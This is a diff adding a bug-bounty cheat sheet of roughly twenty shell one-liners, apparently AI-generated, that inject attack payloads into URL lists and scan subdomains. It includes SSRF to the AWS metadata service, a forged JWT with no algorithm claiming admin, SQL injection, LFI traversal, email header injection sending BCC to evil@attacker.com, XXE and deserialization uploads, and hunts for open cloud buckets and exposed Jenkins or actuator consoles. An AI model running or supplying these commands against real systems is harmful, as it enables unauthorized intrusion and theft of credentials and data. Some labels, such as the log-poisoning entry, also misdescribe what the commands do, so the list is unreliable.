@@ -1428,3 +1428,111 @@ cat bypass_payloads.txt | httpx -silent -mc 200 -o waf_bypass.txt
 ```bash
 cat subdomains.txt | httpx -silent -method OPTIONS -o verb_tampering.txt
 ```
+Here's the converted list for your commands:
+
+🧰 **S3 Bucket Discovery via Subdomain Bruteforce**  
+```bash
+cat subdomains.txt | awk -F. '{print $1"."$2}' | xargs -I {} aws s3 ls s3://{} --no-sign-request 2>/dev/null | tee s3_buckets.txt
+```
+
+💧 **AWS S3 Bucket Takeover (Subdomain Takeover)**  
+```bash
+cat subdomains.txt | xargs -I {} host {} | grep 'amazonaws.com' | awk '{print $1}' | httpx -silent -mc 404 -o vulnerable_s3.txt
+```
+
+📜 **Exposed Swagger/OpenAPI Endpoints**  
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/swagger.json\n/openapi.json\n/api-docs') -mc 200 -o openapi_endpoints.txt
+```
+
+**Prototype Pollution in Query Params**  
+```bash
+cat urls.txt | qsreplace '__proto__[evil]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
+```
+
+💉 **SQL Injection (Basic Reflex Check)**  
+```bash
+cat urls.txt | qsreplace "'" | httpx -silent -fr 'SQL syntax' -o sqli.txt
+```
+
+🔗 **SSRF (Internal IP Scan via Open Redirect or URL Input)**  
+```bash
+cat urls.txt | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -silent -fr 'ami-id' -o ssrf_aws_metadata.txt
+```
+
+🔥 **Spring Boot Actuator Exposure (DevOps Misconfig)**  
+```bash
+cat subdomains.txt | httpx -silent -path /actuator/env -mc 200 -o springboot_actuator_exposed.txt
+```
+
+**JWT None Algorithm Bypass**  
+```bash
+cat urls.txt | qsreplace 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -fr 'admin' -o jwt_none_bypass.txt
+```
+
+**Firebase Misconfig (Open Firebase Databases)**  
+```bash
+cat subdomains.txt | sed 's/$/.firebaseio.com/' | httpx -silent -path /.json -mc 200 -o open_firebase.txt
+```
+
+📡 **GraphQL Playground/Console Discovery**  
+```bash
+cat subdomains.txt | httpx -silent -path /graphiql -mc 200 -o graphql_console.txt
+```
+
+⚠️ **SOAP Service Discovery (Old APIs)**  
+```bash
+cat subdomains.txt | httpx -silent -path /services.wsdl -mc 200 -o soap_services.txt
+```
+
+📬 **Email Injection via Contact Forms**  
+```bash
+cat urls.txt | qsreplace 'test%0d%0aBCC:evil@attacker.com' | httpx -silent -fr 'evil@attacker.com' -o email_injection.txt
+```
+
+🕵️‍♂️ **GCP Bucket Enumeration (Public Buckets)**  
+```bash
+cat subdomains.txt | sed 's/$/.storage.googleapis.com/' | httpx -silent -mc 200 -o gcp_buckets.txt
+```
+
+🛠️ **Deserialization via File Upload (PHP/JAVA Specific)**  
+```bash
+cat upload_endpoints.txt | xargs -I {} curl -X POST -F 'file=@payload.ser' {} -s -o - | grep 'java.lang' -B 2
+```
+
+🔗 **IDOR Detection via Incremental IDs**  
+```bash
+cat urls.txt | qsreplace 'id=123' | anew incremental_ids.txt
+cat incremental_ids.txt | qsreplace 'id=124' | httpx -silent -fr 'profile' -o idor_found.txt
+```
+
+**Azure Blob Storage Enumeration**  
+```bash
+cat subdomains.txt | sed 's/$/.blob.core.windows.net/' | httpx -silent -mc 200 -o azure_blobs.txt
+```
+
+🎯 **XXE Injection via File Upload (XML Files)**  
+```bash
+cat upload_endpoints.txt | xargs -I {} curl -X POST -F 'file=@payload.xml' {} -s -o - | grep 'root:' -B 2
+```
+
+📊 **Exposed Kibana Dashboards (DevOps)**  
+```bash
+cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o exposed_kibana.txt
+```
+
+**CVE Scanner for Web Targets (Nuclei One-Liner)**  
+```bash
+cat subdomains.txt | nuclei -silent -t cves/ -o found_cves.txt
+```
+
+📈 **LFI via Log Poisoning**  
+```bash
+cat urls.txt | qsreplace '../../../../../../../../var/log/nginx/access.log' | httpx -silent -fr 'GET /' -o log_poisoning_lfi.txt
+```
+
+🗄️ **Exposed Jenkins Console (DevOps)**  
+```bash
+cat subdomains.txt | httpx -silent -path /script -mc 200 -o exposed_jenkins.txt
+```
+
